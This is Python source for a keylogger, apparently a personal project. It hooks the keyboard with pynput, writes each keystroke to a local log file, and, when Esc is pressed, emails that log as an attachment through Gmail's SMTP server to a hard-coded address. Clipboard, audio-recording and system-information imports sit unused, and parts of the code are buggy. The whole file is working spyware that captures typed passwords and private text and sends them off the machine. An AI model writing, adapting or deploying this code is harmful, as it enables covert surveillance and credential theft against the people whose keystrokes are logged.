# libraries used
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

## to collect information
import socket
import platform

## getting the clipboard
import win32clipboard

## keystrokes get
from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

# computer infromation
import getpass
from requests import get

# image grab and sscreenshot
from multiprocessing import Process, freeze_support

# from PIL import ImageGrab

# textfile
keys_infomration = "key_log.txt"
email_address = "halladkarthik@gmail.com"
password = ""
toaddr = "halladkarthik@gmail.com"
file_path = "C:\\Users\\karth\\PycharmProjects\\advancedKeylogger"
extend = "\\"  # to extend the file path to key info

#email
def send_email(filename,attachment,toaddr):
    fromaddr = email_address;

    msg = MIMEMultipart()

    msg['From'] =fromaddr
    msg['To'] = toaddr
    msg['Subject'] = 'Log File ' + time.time()
    body = "body of the mail"

    #attach this to the message
    msg.attach(MIMEText(body,'plain'))

    #attachment using MIME
    filename = filename
    attachment = open(filename,'rb')

    #default code for MIME
    p =MIMEBase('application','octet-stream')

    p.set_payload((attachment).read())

    #encoding the email infromation
    encoders.encode_base64(p)

    p.add_header('Content-Disposition',"attachment : filename = %s" % filename)

    msg.attach(p)
    #file successfully attached after creating a MIMEBASE instance

    #starting the stmp session
    s=smtplib.SMTP('smtp.gmail.com',587) #port
    s.starttls()
    s.login(fromaddr,password)

    text = msg.as_string()

    s.sendmail(fromaddr,toaddr,text)

    s.quit()


count = 0;
keys = []


def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count > 0:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_infomration, "a") as f:
        for key in keys:
            # 'h''e' -> h e
            k = str(key).replace("'", "")
            # if space encountered then go to the next line
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            #avoiding keys like KEy.esc and Key.f1
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


# basically releasing if key is pressed (esc key)
def on_release(key):
    if key == Key.esc:
        send_email(keys_infomration, file_path + extend + keys_infomration, toaddr)
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
